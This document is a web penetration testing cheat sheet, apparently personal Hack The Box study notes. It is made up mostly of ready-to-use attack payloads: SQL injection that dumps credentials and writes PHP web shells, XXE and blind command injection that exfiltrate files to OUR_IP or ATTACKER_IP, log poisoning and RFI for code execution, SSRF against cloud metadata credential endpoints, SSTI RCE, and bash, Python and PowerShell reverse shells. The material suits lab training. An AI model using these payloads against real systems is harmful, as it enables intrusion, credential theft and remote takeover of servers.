#  HTB – Penetration Testing Notes for Web Apps

Author: James Saltmer  

---

## 1) Proxies And Burpsuite
### Match and Replace Rules Example (Proxy>Proxy settings>HTTP match and replace rules)
| Field | Value (Example) | Description |
|---|---|---|
|`Type`| `Request header` | Make a change in the request header (not the main body). |
| `Match` | `^User-Agent.*$` | Regex pattern captures the entire line which contains User-Agent |
| `Replace` | `User-Agent: Test Agent 1.0` | This will replace the line (Old agent) with the new agent (Test Agent 1.0) |
| `Regex match` | `True` | In this case the exact User-Agent string / name might not be known so use the regex to match and replace the specified pattern |

### Set a Burpsuite Proxy In metasploit Module:
```bash
set PROXIES HTTP:127.0.0.1:8080
```

## 2) Ffuf

### Getting Started
Help:
```bash
ffuf -h
```

Basic Directory Enum
```bash
#  | -w : Wordlist | -u : URL | -t : threads |
ffuf -w <SNIP>:FUZZ -u http://SERVER_IP:PORT/FUZZ 
```

### Extensions
Fuzz for the Type of Extension Used:
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
```

Fuzz for directories ending in specified exension (.PHP in this case):
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
```

### Reccursive Enumeration
Run ffuf with a recursion depth of 1 for directories with php extension:
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
```


### Subdomain Fuzzing
```bash
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/
```

### VHost Fuzzing
```bash
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
```

### FFUF Filtering
Filter Out Responses Based on Size:
```bash
# Filter out responses with a size of 900
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900
```

### Enumerate Parameters
Enumerate Get Params
```bash
# Change xxx to filter out responses
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
```

Enumerate Post params
```bash
# Change xxx to filter out responses
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

Enumerate Param Values
```bash
# Example wordlist Numbers (1-1000)
for i in $(seq 1 1000); do echo $i >> ids.txt; done

# Fuz the value of id parameter in the post body with numbers from 1-1000
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

## 3) Web Login Bruteforce

Bruteforce with POST request
```bash
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^"
# Could aslo change to "/login:user=^USER^&pass=^PASS^:F=Invalid credentials" to set fail condition
# Or "/login:user=^USER^&pass=^PASS^:S=302" for success condition on response codes
```

Bruteforce with GET request
```bash
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get /
```

## 4) SQL Injection
### Basic Payload
```sql
admin' or '1'='1

admin' or '1'='1' --

admin' or '1'='1' -- -

')-- - or 1=1 -- -
```

### Union (MYSQL)
Detect Number of Columns
```sql
' order by 1-- -

cn' UNION select 1,2,3-- -
```

Injection
```sql
cn' UNION select 1,@@version,3,4-- -
```
Injection for 4 columns
```sql
UNION select username, 2, 3, 4 from passwords-- -
```

Enumerate Database Names
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

Check Current Database
```sql
cn' UNION select 1,database(),2,3-- -
```

Enumerate Tables within a database (dev in this case)
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

Enumerate Columns from table (credentials in this case)
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

Query Data from Table
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

Get Current DB User
```sql
cn' UNION SELECT 1, user(), 3, 4-- -

cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

Check Current User Privileges
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

-- Y Would mean the user has superuser privileges

cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

-- Current user root privileges
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
Read a File
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

Write to a File requires:
1. User with FILE privilege enabled
2. MySQL global secure_file_priv variable not enabled
3. Write access to the location we want to write to on the back-end server

Check if secure_file_priv is empty
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

Write PHP Shell to file
```sql
cn' union select 1,'<?=`$_GET[0]`?>',3,4 into outfile '/var/www/html/test.php'-- -
```

### SQL Map
Basic Command
```bash
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```
`--technique=<TECH>`:
- B: Boolean-based blind
- E: Error-based
- U: Union query-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries

Top Tip:
1. In the browser Copy request as cURL
2. Past into bash
3. Replace curl command with sqlmap, and keep request

POST Requests
```bash
# Defaults to test all params
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'

# Use * to denote specific param (uid in this case)
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

```
Raw Request File:
```bash
sqlmap -r req.txt
```

Specify Cookie:
```bash
# Same can be done for other headers: --host, --referer, and -A/--user-agent
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

# Or parse as header
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

```
Specify Prefix or Suffix:
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
For example vulnerable code:
```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```
With Suffix and Prefix would result in:
```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

More Boundaries:
```bash
sqlmap -u www.example.com/?id=1 --risk=3 3 --level=5
```

## 5) XML External Entity (XXE) Injeciton
### Basic Explanation:
Imagine a web app accepts xml user input and reflects the user's email to the page as such
```xml
<? xml version="1.0" encoding="UTF-8"?>
	<root>
		<name>
			First
		</name>
		<tel>
		</tel>
		<email>
			test@xxe.com
		</email>
		<message>
			Test
		</message>
	</root>
```
Response:
```txt
Check your email test@xxe.com for further instructions
```

We can insert a malicious xxe payload to read files:
```xml
<? xml version="1.0" encoding="UTF-8"?>
	<! DOCTYPE email [
	<! ENTITY company SYSTEM "file:///etc/passwd">
	]>
	<root>
		<name>
			First
		</name>
		<tel>
		</tel>
		<email>
			&company;
		</email>
		<message>
			Test
		</message>
	</root>
```
Response:
```txt
Check your email root:x:0:0:root:/root:/bin/bash ... for further instructions
```

If there are issues with not seeing content, likely due to XML special chars escaping the xml. This can be solved using `php://filter/` with `convert.base64-encode`:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=target-file.php">
]>
```

You can also try wrapping it in CDATA if you expect special characters:
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email>
```

### Blind XXE
If the server does not output any fields we have control over we can check for errors. If errors are outputed, we can host a `.dtd` file to display the output of other files on error:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
```bash
python3 -m http.server 8000
```

And then submit the following payload:
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

When Fully Blind:
`xxe.dtd`:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
`index.php`:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
Start PHP:
```bash
php -S 0.0.0.0:8000
```
Payload to send:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

### RCE with XXE
RCE with XXE can be possible using `expect://<command>`. We can generate a  webshell:
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```
And then attempt to use curl to download the webshell to the server, using `$IFS` to handle whitespace.
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

## 6) File Upload Bypasses

### Quick Checks
Things to identify first:

| Check | Why it matters |
|---|---|
| Allowed extensions | Determines bypass strategy |
| Upload path | Confirms if file is web-accessible |
| Rename behaviour | Need final filename to execute/access |
| Content-Type validation | Can often be changed in Burp |
| Magic byte validation | Need valid file header/polyglot |
| Server stack | PHP/ASP/JSP payload choice |

### Basic PHP Web Shells
```php
<?php system($_GET['cmd']); ?>
```
```php
<?=`$_GET[0]`?>
```

Usage:
```bash
curl 'http://target/uploads/shell.php?cmd=id'
curl 'http://target/uploads/shell.php?0=id'
```

### Extension Bypasses
Try these when `.php` is blocked:
```text
shell.php5
shell.phtml
shell.phar
shell.php.
shell.php%00.jpg
shell.php%20
shell.php%0a
shell.php/
shell.php;.jpg
shell.jpg.php
shell.PHP
```

Apache/PHP common executable extensions:
```text
.php
.php3
.php4
.php5
.phtml
.phar
```

ASP/ASPX/JSP targets:
```text
shell.asp
shell.aspx
shell.jsp
```

### Content-Type Bypass
Change in Burp:
```http
Content-Type: image/jpeg
```

Other useful types:
```text
image/png
image/gif
application/octet-stream
text/plain
```

### Magic Byte / Polyglot Bypass
Add image headers before PHP:
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

Or append shell to real image:
```bash
cp image.jpg shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

### Double Extension With Weak Server Rules
```text
shell.php.jpg
shell.jpg.php
shell.phtml.jpg
```

If Apache is configured with multiple extension handling, `file.php.jpg` may still execute as PHP.

### Useful Upload Locations to Try
```text
/uploads/shell.php
/upload/shell.php
/files/shell.php
/images/shell.php
/assets/shell.php
/static/shell.php
/media/shell.php
```

### If Upload Is Stored but Not Executed
Try to combine with:

| Technique | Example |
|---|---|
| LFI include | `?page=uploads/shell.php` |
| Path traversal | `?file=../../uploads/shell.php` |
| Filename injection | filename as `../../../var/www/html/shell.php` |
| Image processing bugs | metadata or parser-based issues |

## 7) LFI / RFI / Path Traversal

### Parameters Worth Testing
```text
file=
path=
page=
template=
view=
include=
document=
download=
folder=
lang=
locale=
```

### Basic Linux Reads
```text
../../../../etc/passwd
../../../../../../etc/passwd
/etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

Useful Linux files:
```text
/etc/passwd
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd/index.php
/var/www/html/index.php
/var/www/html/config.php
/var/log/apache2/access.log
/var/log/nginx/access.log
```

### Basic Windows Reads
```text
..\..\..\..\windows\win.ini
../../../../windows/win.ini
C:\Windows\win.ini
C:/Windows/System32/drivers/etc/hosts
```

Useful Windows files:
```text
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
C:\Users\<USER>\Desktop\user.txt
```

### PHP Wrappers
Read source as base64:
```text
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
```

Decode:
```bash
echo '<BASE64>' | base64 -d
```

Other wrappers to test:
```text
php://input
data://text/plain,<?php system($_GET['cmd']); ?>
expect://id
zip://shell.zip%23shell.php
phar://shell.phar
```

### Log Poisoning to RCE
Poison User-Agent:
```http
User-Agent: <?php system($_GET['cmd']); ?>
```

Include access log:
```text
?page=../../../../var/log/apache2/access.log&cmd=id
?page=../../../../var/log/nginx/access.log&cmd=id
```

Other poisonable files:
```text
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/proc/self/environ
```

### RFI Quick Check
Requires remote includes or equivalent risky behaviour.
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
python3 -m http.server 8000
```

Payload:
```text
?page=http://ATTACKER_IP:8000/shell.txt&cmd=id
```

## 8) SSRF

### Quick Test URLs
Use your listener first:
```bash
sudo tcpdump -ni tun0 port 80
python3 -m http.server 80
```

Payloads:
```text
http://ATTACKER_IP/
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/
```

### Internal Service Targets
```text
http://127.0.0.1:80/
http://127.0.0.1:5000/
http://127.0.0.1:8000/
http://127.0.0.1:8080/
http://127.0.0.1:9000/
http://localhost:3000/
```

Internal host discovery:
```text
http://10.0.0.1/
http://172.16.0.1/
http://192.168.0.1/
```

### Cloud Metadata
AWS:
```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

AWS IMDSv2 requires a token, but IMDSv1 may still work:
```bash
curl http://169.254.169.254/latest/meta-data/
```

Azure:
```text
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

GCP:
```text
http://metadata.google.internal/computeMetadata/v1/
```

### Bypass Tricks
```text
http://127.1/
http://2130706433/
http://0177.0.0.1/
http://0x7f.0x00.0x00.0x01/
http://localhost@evil.com/
http://evil.com@127.0.0.1/
http://127.0.0.1.nip.io/
```

URL encoding:
```text
http://127.0.0.1%2f
http://127.0.0.1%252f
```

### SSRF Port Scan With ffuf
```bash
seq 1 10000 > ports.txt
ffuf -w ports.txt:FUZZ -u 'http://target/fetch?url=http://127.0.0.1:FUZZ/' -fs <BASELINE_SIZE>
```

### SSRF to Redis Quick Win
If `gopher://` is supported, Redis on localhost can sometimes write files or cron jobs.
Test first:
```text
gopher://127.0.0.1:6379/_
```

Often blocked, but worth remembering when SSRF supports non-HTTP schemes.

## 9) SSTI

### Detection Payloads
Generic:
```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${{7*7}}
```

If output is `49`, identify the engine.

### Jinja2 / Flask
Detection:
```text
{{7*7}}
{{config}}
{{self}}
```

Read files:
```text
{{ cycler.__init__.__globals__.open('/etc/passwd').read() }}
```

RCE:
```text
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

Alternative:
```text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Reverse shell:
```text
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read() }}
```

### Twig / Symfony
Detection:
```text
{{7*7}}
{{_self}}
```

RCE attempts:
```text
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
```

### Freemarker
Detection:
```text
${7*7}
```

RCE:
```text
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

### Velocity
Detection:
```text
#set($x=7*7)$x
```

### ERB / Ruby
Detection:
```text
<%= 7*7 %>
```

RCE:
```text
<%= system('id') %>
<%= `id` %>
```

## 10) Command Injection

### Basic Separators
```text
;id
&& id
|| id
| id
`id`
$(id)
%0aid
%0did
```

Windows:
```text
& whoami
&& whoami
| whoami
%0a whoami
```

### Blind Command Injection
Time delay:
```text
;sleep 5
&& sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
```

Windows delay:
```text
& timeout /T 5
& ping -n 6 127.0.0.1
```

Out-of-band:
```text
;curl http://ATTACKER_IP/$(whoami)
;wget http://ATTACKER_IP/$(hostname)
;nslookup $(whoami).ATTACKER_DOMAIN
```

Listener:
```bash
python3 -m http.server 80
sudo tcpdump -ni tun0 icmp or port 53 or port 80
```

### Whitespace Bypasses
```text
${IFS}
$IFS$9
%09
%0a
<
```

Examples:
```text
;cat${IFS}/etc/passwd
;cat</etc/passwd
;bash${IFS}-c${IFS}'id'
```

### Character Bypasses
If `/` is blocked:
```bash
echo ${PATH:0:1}
```

Payload:
```text
;cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

If spaces and slashes are blocked, try base64:
```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64 -w0
```

Payload:
```text
;echo${IFS}<BASE64>|base64${IFS}-d|bash
```

### Reverse Shells
Listener:
```bash
nc -lvnp 4444
```

Bash:
```text
;bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

URL-encoded bash:
```text
%3bbash%20-c%20%27bash%20-i%20%3e%26%20/dev/tcp/ATTACKER_IP/4444%200%3e%261%27
```

Python:
```text
;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
```

Windows PowerShell:
```powershell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

### Common Injection Points
```text
host=
ip=
domain=
url=
cmd=
command=
exec=
ping=
debug=
file=
path=
```
